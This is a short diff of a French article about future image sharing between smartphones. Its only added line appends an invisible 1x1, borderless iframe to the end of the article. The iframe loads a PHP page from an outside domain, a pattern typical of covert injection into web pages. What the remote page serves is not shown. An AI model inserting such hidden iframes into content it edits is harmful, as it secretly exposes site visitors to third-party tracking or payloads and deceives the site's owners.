@@ -26,3 +26,4 @@ Dans le futur, on pourrait même imaginer l'envoi d'images entre deux smartphone
 
 Qu'en pensez-vous ?
 
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
